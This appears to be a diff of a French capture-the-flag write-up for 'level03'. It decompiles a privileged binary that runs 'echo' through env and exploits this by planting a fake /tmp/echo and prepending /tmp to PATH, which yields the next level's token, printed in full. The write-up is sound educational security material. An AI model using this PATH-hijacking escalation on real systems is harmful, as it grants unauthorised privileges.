@@ -1,53 +1,43 @@
 # Rapport CTF - [level03]
 
+### Observation:
+En arrivant sur le level on trouve un exécutable nommer `level03` qui a été créer par flag03: `ls -la`
+
+### Code:
+Nous allons donc décompiler le code pour pouvoir le comprendre.
+On utilise la commande `scp` pour ramener l'exécutable sur notre pc:
+`scp -P {PORT} level03@localhost:/home/user/level03/level03 .`
+
+En décompilant grace a Ghidra ou Hex-Ray nous obtenons le code suivant:
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+__gid_t v4; // [esp+18h] [ebp-8h]
+__uid_t v5; // [esp+1Ch] [ebp-4h]
+
+v4 = getegid();
+v5 = geteuid();
+setresgid(v4, v4, v4);
+setresuid(v5, v5, v5);
+return system("/usr/bin/env echo Exploit me");
+}
+```
+On remarque que le `echo` est lancer depuis l'env.
 
 
 
+### Solution :
+Nous avons donc 2 solutions, soient changées la variable d'environnement echo, soit ajouter une variable d'environnement echo qui lance une commande, nous allons faire cette 2eme solution, car c'est plus simple à enlever.
+La première étape consiste a créer un fichier qui se nomme echo avec la commande a exécuter à l'intérieur:
+`echo /bin/getflag > /tmp/echo`
+Nous devons aussi lui donner les droits d'être exécuter par un autre programme:
+`chmod 777 /tmp/echo`
 
+Puis on ajoute notre fake echo dans les variables d'environnement:
+`export PATH=/tmp:$PATH`
 
+On lance ensuite notre programme, `./level03`
 
+Et il nous donne directement le mot de passe de l'utilisateur level04 sans avoir besoin de passer par le flag03.
 
-
-
-
-
-
-
-
-1. ### Objectif 1 - Analyse de l'exécutable
-   - **Description :** L'épreuve consistait à analyser un exécutable qui affiche le message "exploit me" lorsqu'il est exécuté.
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Exécution de `ls -la` pour lister les fichiers dans le répertoire.
-     - Découverte d'un exécutable.
-     - Exécution de l'exécutable, qui a affiché "exploit me".
-   
-2. ### Objectif 2 - Transfert de l'exécutable vers un serveur Linux
-   - **Description :** Transférer l'exécutable vers un serveur Linux pour une analyse plus approfondie avec Ghidra.
-   - **Solution :** Les étapes suivantes ont été suivies :
-     - Utilisation de la commande `scp` pour transférer l'exécutable depuis la machine de capture vers le serveur Linux.
-     - Commande utilisée : `scp level03 vmuller@192.168.1.21:/home/vmuller`.
-
-3. ### Objectif 3 - Analyse de l'exécutable avec Ghidra
-   - **Description :** Analyser l'exécutable avec Ghidra pour examiner le code source ou le code assembleur.
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Installation de Ghidra si ce n'était pas déjà fait.
-     - Lancement de `./ghidraRun` et ouverture de Ghidra.
-     - Utilisation de Ghidra pour désassembler le code de l'exécutable.
-     - Identification du code source ou du code assembleur.
-
-4. ### Objectif 4 - Découverte de la vulnérabilité
-   - **Description :** Identifier la vulnérabilité dans le code, qui permettra d'exploiter le programme.
-   - **Solution :** Les étapes suivantes ont été effectuées :
-     - Examen du code désassemblé avec Ghidra.
-     - Identification de la ligne `/usr/bin/env echo Exploit me`.
-     - Identification de l'appel système `::system undefined system()`, indiquant que le programme exécute cette commande.
-
-5. ### Objectif 5 - Exploitation de la vulnérabilité
-   - **Description :** Exploiter la vulnérabilité pour exécuter une commande différente.
-   - **Solution :** Les étapes suivantes ont été réalisées :
-     - Création d'un nouveau fichier "echo" dans le répertoire "/tmp" avec la commande `echo whoami > /tmp/echo`.
-     - Attribution des autorisations nécessaires au fichier "echo".
-     - Modification du chemin d'accès avec `export PATH=/tmp:$PATH` pour donner la priorité au répertoire "/tmp".
-     - Exécution de l'exécutable "level03" avec `./level03` pour constater qu'il appartient au groupe "flag03".
-     - Modification du fichier "echo" pour exécuter `getflag` avec `echo getflag > /tmp/echo`.
-     - Exécution de "level03" à nouveau pour obtenir le token : "qi0maab88jeaj46qoumi7maus".
+token : qi0maab88jeaj46qoumi7maus
